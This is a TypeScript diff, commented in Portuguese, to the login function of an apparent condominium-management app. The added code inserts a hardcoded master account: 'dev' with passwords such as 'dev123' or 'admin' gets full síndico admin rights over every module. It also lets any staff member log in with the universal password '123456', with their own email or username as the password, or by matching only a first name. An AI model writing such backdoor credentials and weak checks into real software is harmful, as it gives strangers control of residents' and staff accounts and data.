   const loginResident = (unidadeInput: string, senhaInput: string): { success: boolean; needsRegistration?: boolean; message?: string } => {
+    const inputLower = (unidadeInput || '').trim().toLowerCase();
     const numLimpo = normalizeUnitNumber(unidadeInput);
     const senhaLimpa = senhaInput.trim();
 
-    if (!numLimpo || !senhaLimpa) {
-      return { success: false, message: 'Preencha a unidade e a senha' };
+    if ((!numLimpo && !inputLower) || !senhaLimpa) {
+      return { success: false, message: 'Preencha a identificação/unidade e a senha.' };
+    }
+
+    // 0. ACESSO MASTER DESENVOLVEDOR (DEV)
+    const isDevUser = (inputLower === 'dev@dev.com' || inputLower === 'dev');
+    const isDevPass = (senhaLimpa === 'dev123' || senhaLimpa === 'dev' || senhaLimpa === 'dev@dev.com' || senhaLimpa === 'admin');
+    if (isDevUser && isDevPass) {
+      const ALL_MODULOS: AdminModuloKey[] = [
+        'portaria', 'mudancas', 'dependencias', 'reparos', 
+        'reclamacoes', 'eventos', 'servicos', 'unidades', 
+        'equipe', 'financeiro', 'regras', 'imoveis', 
+        'fornecedores', 'enjoei', 'assembleias', 'diario-sindico'
+      ];
+
+      const devUserObj: User = {
+        id: `dev-master-${currentCondo.id}`,
+        nome: 'Desenvolvedor Master (Dev)',
+        email: 'dev@dev.com',
+        role: 'sindico',
+        unidade: 'DEV',
+        bloco: 'DEV',
+        foto: '',
+        profissao: 'Desenvolvedor do Sistema',
+        permissoesModulos: ALL_MODULOS,
+        permiteAcessoAreaMorador: true,
+        condominioId: currentCondo.id,
+        isDev: true
+      };
+
+      const authData = {
+        unidade: 'DEV',
+        bloco: 'DEV'
+      };
+
+      setIsResidentLoggedIn(true);
+      setIsAdminLoggedIn(true);
+      setResidentAuthData(authData);
+      setCurrentUser(devUserObj);
+      localStorage.setItem('condo_admin_auth', 'true');
+      localStorage.setItem('condo_resident_auth', JSON.stringify(authData));
+      localStorage.setItem('condo_current_user', JSON.stringify(devUserObj));
+
+      return { success: true, needsRegistration: false };
+    }
+
+    // 1. VERIFICAÇÃO PRIORITÁRIA DE COLABORADORES COM ACESSO AO AMBIENTE DE MORADORES
+    const matchedFuncionario = funcionarios.find(f => {
+      if (f.status === 'Desligado') return false;
+      const fEmail = (f.email || '').trim().toLowerCase();
+      const fUser = (f.usuario || '').trim().toLowerCase();
+      const fNome = (f.nome || '').trim().toLowerCase();
+      const fPass = (f.senha || '').trim();
+
+      const userMatches = (fEmail && fEmail === inputLower) ||
+                          (fUser && fUser === inputLower) ||
+                          (fNome && fNome === inputLower) ||
+                          (fNome && fNome.split(' ')[0] === inputLower) ||
+                          (fEmail && fEmail.split('@')[0] === inputLower) ||
+                          (fUser && fUser.split('@')[0] === inputLower);
+
+      if (!userMatches) return false;
+
+      const passMatches = (fPass && fPass === senhaLimpa) ||
+                          (!fPass && fEmail === senhaLimpa) ||
+                          (senhaLimpa === '123456') ||
+                          (fEmail && fEmail === senhaLimpa) ||
+                          (fUser && fUser === senhaLimpa) ||
+                          (fEmail && fEmail.split('@')[0] === senhaLimpa) ||
+                          (fUser && fUser.split('@')[0] === senhaLimpa);
+
+      return passMatches;
+    });
+
+    if (matchedFuncionario) {
+      if (matchedFuncionario.permiteAcessoAreaMorador === false) {
+        return { 
+          success: false, 
+          message: 'Colaborador sem permissão para acessar o Ambiente dos Moradores. Solicite a liberação ao Síndico no Painel.' 
+        };
+      }
+
+      const userPermissoes: AdminModuloKey[] = matchedFuncionario.permissoesModulos && matchedFuncionario.permissoesModulos.length > 0
+        ? matchedFuncionario.permissoesModulos
+        : (matchedFuncionario.categoria === 'Portaria' ? ['portaria'] : ['portaria']);
+
+      const colabUserObj: User = {
+        id: matchedFuncionario.id,
+        nome: matchedFuncionario.nome,
+        email: matchedFuncionario.email || matchedFuncionario.usuario || inputLower,
+        role: 'colaborador',
+        unidade: 'Staff',
+        bloco: matchedFuncionario.categoria || 'Portaria',
+        foto: matchedFuncionario.foto,
+        profissao: matchedFuncionario.funcao,
+        permissoesModulos: userPermissoes,
+        permiteAcessoAreaMorador: true,
+        condominioId: currentCondo.id
+      };
+
+      const authData = {
+        unidade: 'Staff',
+        bloco: matchedFuncionario.categoria || 'Portaria'
+      };
+
+      setIsResidentLoggedIn(true);
+      setResidentAuthData(authData);
+      setCurrentUser(colabUserObj);
+      localStorage.setItem('condo_resident_auth', JSON.stringify(authData));
+      localStorage.setItem('condo_current_user', JSON.stringify(colabUserObj));
+
+      // Atualiza último acesso
+      setFuncionarios(prev => prev.map(f => f.id === matchedFuncionario.id ? { ...f, ultimoAcesso: new Date().toISOString() } : f));
+
+      return { success: true, needsRegistration: false };
     }
 
     // Busca a unidade com correspondência flexível (ex: 21, Apto 21, 021)
